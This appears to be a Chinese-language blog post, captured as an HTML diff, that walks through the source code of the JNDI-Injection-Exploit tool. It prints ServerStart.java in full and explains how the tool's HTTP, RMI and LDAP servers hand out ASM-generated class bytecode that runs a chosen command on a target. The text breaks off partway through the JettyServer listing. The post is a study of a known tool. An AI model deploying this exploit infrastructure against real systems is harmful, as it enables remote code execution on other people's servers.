@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00 前言最近在学习webLogic、Jackson漏洞的过程中用到了很多次JNDI-Injection-Exploit工具，出于好奇学习了下内部代码。 0x01 一些基础知识0x02 结合代码深入学习从程序入口开始，按照目录依次分析  run：ServerStart.java 开启整个JNDI服务 util：Mapper.java；Reflections.java；Transformers.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI-Injection-Exploit工具代码简单学习">
+<meta property="og:url" content="http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="0x00 前言最近在学习webLogic、Jackson漏洞的过程中用到了很多次JNDI-Injection-Exploit工具，出于好奇学习了下内部代码。 0x01 一些基础知识0x02 结合代码深入学习从程序入口开始，按照目录依次分析  run：ServerStart.java 开启整个JNDI服务 util：Mapper.java；Reflections.java；Transformers.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/08/12/imgs/image-20200813144416117.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/12/imgs/image-20200813201605598.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/12/imgs/image-20200813171228268.png">
+<meta property="article:published_time" content="2020-08-12T06:00:12.000Z">
+<meta property="article:modified_time" content="2020-08-12T06:00:12.000Z">
+<meta property="article:author" content="R17a">
+<meta property="article:tag" content="JNDI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/08/12/imgs/image-20200813144416117.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>JNDI-Injection-Exploit工具代码简单学习</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/08/26/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/07/22/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&text=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&is_video=false&description=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JNDI-Injection-Exploit工具代码简单学习&body=Check out this article: http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&name=JNDI-Injection-Exploit工具代码简单学习&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&t=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-一些基础知识"><span class="toc-number">2.</span> <span class="toc-text">0x01 一些基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-结合代码深入学习"><span class="toc-number">3.</span> <span class="toc-text">0x02 结合代码深入学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#run：ServerStart-java"><span class="toc-number">3.1.</span> <span class="toc-text">run：ServerStart.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Util"><span class="toc-number">3.2.</span> <span class="toc-text">Util</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Transformers-动态生成执行命令的字节码"><span class="toc-number">3.2.1.</span> <span class="toc-text">Transformers-动态生成执行命令的字节码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jetty：JettyServer-java"><span class="toc-number">3.3.</span> <span class="toc-text">jetty：JettyServer.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jndi：LDAPRefServer-java；RMIRefServer-java"><span class="toc-number">3.4.</span> <span class="toc-text">jndi：LDAPRefServer,java；RMIRefServer.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMIRefServer-java"><span class="toc-number">3.5.</span> <span class="toc-text">RMIRefServer.java</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        JNDI-Injection-Exploit工具代码简单学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-08-12T06:00:12.000Z" itemprop="datePublished">2020-08-12</time>
+        
+        (Updated: <time datetime="2020-08-12T06:00:12.000Z" itemprop="dateModified">2020-08-12</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a> › <a class="category-link" href="/categories/%E5%B7%A5%E5%85%B7/JNDI/">JNDI</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/JNDI/" rel="tag">JNDI</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在学习webLogic、Jackson漏洞的过程中用到了很多次<a href="https://github.com/welk1n/JNDI-Injection-Exploit/" target="_blank" rel="noopener">JNDI-Injection-Exploit</a>工具，出于好奇学习了下内部代码。</p>
+<h2 id="0x01-一些基础知识"><a href="#0x01-一些基础知识" class="headerlink" title="0x01 一些基础知识"></a>0x01 一些基础知识</h2><h2 id="0x02-结合代码深入学习"><a href="#0x02-结合代码深入学习" class="headerlink" title="0x02 结合代码深入学习"></a>0x02 结合代码深入学习</h2><p>从程序入口开始，按照目录依次分析</p>
+<ol>
+<li>run：ServerStart.java 开启整个JNDI服务</li>
+<li>util：Mapper.java；Reflections.java；Transformers.java  通用的工具</li>
+<li>jetty：JettyServer.java 开启HTTP相关服务</li>
+<li>jndi：LDAPRefServer,java；RMIRefServer.java 开启RMI、LDAP服务</li>
+</ol>
+<img src="../imgs/image-20200813144416117.png" alt="image-20200813144416117" align='left'/>
+
+<h3 id="run：ServerStart-java"><a href="#run：ServerStart-java" class="headerlink" title="run：ServerStart.java"></a>run：ServerStart.java</h3><p>ServerStart.java很简单明了，就是根据IP、命令、默认设置的端口开启HTTP、RMI、LDAP服务，并记录输出日志信息</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServerStart</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String addr = getLocalIpByNetcard();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//default ports</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> rmiPort = <span class="number">1099</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> ldapPort = <span class="number">1389</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> jettyPort = <span class="number">8180</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> JettyServer jettyServer;</span><br><span class="line">    <span class="keyword">private</span> RMIRefServer rmiRefServer;</span><br><span class="line">    <span class="keyword">private</span> LDAPRefServer ldapRefServer;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        CommandLineParser parser = new DefaultParser();</span></span><br><span class="line"><span class="comment">//        CommandLine cmd = null;</span></span><br><span class="line"><span class="comment">//        //default command</span></span><br><span class="line"><span class="comment">//        String[] cmdArray = &#123;"open","/Applications/Calculator.app"&#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        try&#123;</span></span><br><span class="line"><span class="comment">//            cmd = parser.parse(cmdlineOptions(),args);</span></span><br><span class="line"><span class="comment">//        &#125;catch (Exception e)&#123;</span></span><br><span class="line"><span class="comment">//            System.err.println("Cmdlines parse failed.");</span></span><br><span class="line"><span class="comment">//            System.exit(1);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        if(cmd.hasOption("C")) &#123;</span></span><br><span class="line"><span class="comment">//            cmdArray = cmd.getOptionValues('C');</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        if(cmd.hasOption("A")) &#123;</span></span><br><span class="line"><span class="comment">//            addr = cmd.getOptionValue('A');</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        String cmdArray = <span class="string">"calc"</span>;</span><br><span class="line">        addr = <span class="string">"192.168.116.1"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据IP、端口、命令开启http、rmi、ldap服务</span></span><br><span class="line">        ServerStart servers = <span class="keyword">new</span> ServerStart(<span class="keyword">new</span> URL(<span class="string">"http://"</span>+ addr +<span class="string">":"</span>+ jettyPort +<span class="string">"/"</span>),StringUtils.join(cmdArray,<span class="string">" "</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 日志信息</span></span><br><span class="line">        System.out.println(<span class="string">"[ADDRESS] &gt;&gt; "</span> + addr);</span><br><span class="line">        System.out.println(<span class="string">"[COMMAND] &gt;&gt; "</span> + withColor(StringUtils.join(cmdArray,<span class="string">" "</span>),ANSI_BLUE));</span><br><span class="line">        Class.forName(<span class="string">"util.Mapper"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"----------------------------Server Log----------------------------"</span>);</span><br><span class="line">        System.out.println(getLocalTime() + <span class="string">" [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:"</span> + jettyPort);</span><br><span class="line">        Thread threadJetty = <span class="keyword">new</span> Thread(servers.jettyServer);</span><br><span class="line">        threadJetty.start();</span><br><span class="line"></span><br><span class="line">        System.out.println(getLocalTime() + <span class="string">" [RMISERVER]  &gt;&gt; Listening on 0.0.0.0:"</span> + rmiPort);</span><br><span class="line">        Thread threadRMI = <span class="keyword">new</span> Thread(servers.rmiRefServer);</span><br><span class="line">        threadRMI.start();</span><br><span class="line"></span><br><span class="line">        Thread threadLDAP = <span class="keyword">new</span> Thread(servers.ldapRefServer);</span><br><span class="line">        threadLDAP.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServerStart</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.codebase = <span class="keyword">new</span> URL(<span class="string">"http://"</span>+ getLocalIpByNetcard() +<span class="string">":"</span>+ jettyPort +<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line">        jettyServer = <span class="keyword">new</span> JettyServer(jettyPort,cmd);</span><br><span class="line">        rmiRefServer = <span class="keyword">new</span> RMIRefServer(rmiPort, codebase, cmd);</span><br><span class="line">        ldapRefServer = <span class="keyword">new</span> LDAPRefServer(ldapPort,codebase);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据IP、命令、默认设置的端口，创建HTTP、RMI、LDAP服务</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServerStart</span><span class="params">(URL codebase, String cmd)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.codebase = codebase;</span><br><span class="line"></span><br><span class="line">        jettyServer = <span class="keyword">new</span> JettyServer(jettyPort,cmd);</span><br><span class="line">        rmiRefServer = <span class="keyword">new</span> RMIRefServer(rmiPort, codebase, cmd);</span><br><span class="line">        ldapRefServer = <span class="keyword">new</span> LDAPRefServer(ldapPort,<span class="keyword">this</span>.codebase);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  命令行获取IP和执行命令信息</span></span><br><span class="line"><span class="comment">     *  Option是Apache 下面的一个解析命令行输入的工具包</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Options <span class="title">cmdlineOptions</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Options opts = <span class="keyword">new</span> Options();</span><br><span class="line">        <span class="comment">// 定义参数选项命令信息 -C</span></span><br><span class="line">        Option c = <span class="keyword">new</span> Option(<span class="string">"C"</span>,<span class="keyword">true</span>,<span class="string">"The command executed in remote .class."</span>);</span><br><span class="line">        c.setArgs(Option.UNLIMITED_VALUES);</span><br><span class="line">        opts.addOption(c);</span><br><span class="line">        <span class="comment">// 定义参数选项IP信息 -A</span></span><br><span class="line">        Option addr = <span class="keyword">new</span> Option(<span class="string">"A"</span>,<span class="keyword">true</span>,<span class="string">"The address of server(ip or domain)."</span>);</span><br><span class="line">        opts.addOption(addr);</span><br><span class="line">        <span class="keyword">return</span> opts;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 直接根据第一个网卡地址作为其内网ipv4地址</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getLocalIpByNetcard</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (Enumeration&lt;NetworkInterface&gt; e = NetworkInterface.getNetworkInterfaces(); e.hasMoreElements(); ) &#123;</span><br><span class="line">                NetworkInterface item = e.nextElement();</span><br><span class="line">                <span class="keyword">for</span> (InterfaceAddress address : item.getInterfaceAddresses()) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (item.isLoopback() || !item.isUp()) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (address.getAddress() <span class="keyword">instanceof</span> Inet4Address) &#123;</span><br><span class="line">                        Inet4Address inet4Address = (Inet4Address) address.getAddress();</span><br><span class="line">                        <span class="keyword">return</span> inet4Address.getHostAddress();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> InetAddress.getLocalHost().getHostAddress();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get current time</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getLocalTime</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Date d = <span class="keyword">new</span> Date();</span><br><span class="line">        DateFormat sdf = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line">        <span class="keyword">return</span> sdf.format(d);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Boolean <span class="title">isLinux</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !System.getProperty(<span class="string">"os.name"</span>).toLowerCase().startsWith(<span class="string">"win"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">withColor</span><span class="params">(String str,String color)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isLinux()) &#123;</span><br><span class="line">            <span class="keyword">return</span> color + str + ANSI_RESET;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Util"><a href="#Util" class="headerlink" title="Util"></a>Util</h3><p>Mapper很明了，主要是用来输出提示，告知用户相关信息</p>
+<p><img src="../imgs/image-20200813201605598.png" alt="image-20200813201605598"></p>
+<h4 id="Transformers-动态生成执行命令的字节码"><a href="#Transformers-动态生成执行命令的字节码" class="headerlink" title="Transformers-动态生成执行命令的字节码"></a>Transformers-动态生成执行命令的字节码</h4><p>Transformers主要用ASM来动态生成执行命令的字节码，便于实现远程服务器从HTTP服务器获取class来执行命令。</p>
+<p>ASM是一个Java字节码操纵框架，被用来<strong>动态生成类</strong>或者增强既有类的功能。所以它能灵活地根据输入的参数插入到类模板，从而实现执行任何命令需求。</p>
+<p>ASM的核心API：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassReader：用于读取已经编译好的.class文件。</span><br><span class="line">ClassWriter：用于重新构建编译后的类，如修改类名、属性以及方法，也可以生成新的类的字节码文件。</span><br><span class="line">各种Visitor类：ASM内部采用访问者模式根据字节码从上到下依次处理，对于字节码文件中不同的区域有不同的Visitor。用于访问方法的MethodVisitor、用于访问类变量的FieldVisitor、用于访问注解的AnnotationVisitor等。为了实现AOP，重点要使用的是MethodVisitor。</span><br></pre></td></tr></table></figure>
+
+<p><img src="../imgs/image-20200813171228268.png" alt="image-20200813171228268"></p>
+<h3 id="jetty：JettyServer-java"><a href="#jetty：JettyServer-java" class="headerlink" title="jetty：JettyServer.java"></a>jetty：JettyServer.java</h3><p>JettyServe用于开启HTTP服务，主要是提供远程服务器class字节码，这个字节码由Transformers根据请求的是JDK7还是JDK8的模板来生成执行命令的class字节码，从而动态执行命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Classname</span> 